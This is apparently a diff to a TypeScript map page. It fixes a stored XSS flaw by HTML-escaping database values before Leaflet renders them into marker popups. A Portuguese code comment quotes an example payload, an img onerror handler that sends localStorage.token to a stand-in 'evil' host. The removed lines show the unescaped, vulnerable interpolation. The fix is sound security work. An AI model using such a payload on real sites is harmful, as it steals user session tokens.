@@ -8,6 +8,20 @@ import { fetchVisitas } from "@/features/visitas/data";
 import { STATUS_VISITA, type VisitaStatus } from "@/features/visitas/types";
 import { Button } from "@/components/ui/button";
 
+/**
+ * Escapa texto para interpolação em HTML. O Leaflet monta o popup por
+ * innerHTML — não há JSX aqui para escapar por nós.
+ * As cinco entidades são as que fecham atributo, tag e handler.
+ */
+function escapar(t: unknown): string {
+  return String(t ?? "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
 export const Route = createFileRoute("/_authenticated/mapa")({
   component: MapaPage,
 });
@@ -62,12 +76,17 @@ function MapaPage() {
         iconSize: [18, 18],
       });
       const marker = L.marker([Number(v.latitude), Number(v.longitude)], { icon });
+      // XSS: `nome` e `titulo` vêm do banco e QUALQUER gestor os digita. O
+      // Leaflet injeta esta string via innerHTML, então um cliente chamado
+      // `<img src=x onerror=fetch('//evil/'+localStorage.token)>` executaria
+      // no navegador de todo mundo que abrisse o mapa — e a sessão do Supabase
+      // mora no localStorage. Escapar aqui não é zelo, é o que fecha o buraco.
       const popup = `
-        <div style="font-family:Inter,sans-serif;min-width:180px">
-          <div style="font-weight:600;font-size:13px;color:#1F3864">${v.cliente?.nome ?? v.titulo}</div>
-          <div style="font-size:11px;color:#6b7280;margin-top:2px">${v.data_hora_agendada ? new Date(v.data_hora_agendada).toLocaleString("pt-BR") : "Sem data"}</div>
-          <div style="margin-top:4px;font-size:11px"><span style="background:${info.pin};color:white;padding:1px 6px;border-radius:4px">${info.label}</span></div>
-          <a href="/visita/${v.id}" data-id="${v.id}" style="margin-top:6px;display:inline-block;font-size:12px;color:#1F3864;font-weight:600">Ver detalhes →</a>
+        <div style="font-family:var(--fonte);min-width:180px">
+          <div style="font-weight:600;font-size:13px;color:#1F3864">${escapar(v.cliente?.nome ?? v.titulo)}</div>
+          <div style="font-size:11px;color:#6b7280;margin-top:2px">${v.data_hora_agendada ? escapar(new Date(v.data_hora_agendada).toLocaleString("pt-BR")) : "Sem data"}</div>
+          <div style="margin-top:4px;font-size:11px"><span style="background:${escapar(info.pin)};color:white;padding:1px 6px;border-radius:4px">${escapar(info.label)}</span></div>
+          <a href="/visita/${encodeURIComponent(v.id)}" data-id="${escapar(v.id)}" style="margin-top:6px;display:inline-block;font-size:12px;color:#1F3864;font-weight:600">Ver detalhes →</a>
         </div>`;
       marker.bindPopup(popup);
       marker.addTo(layer);
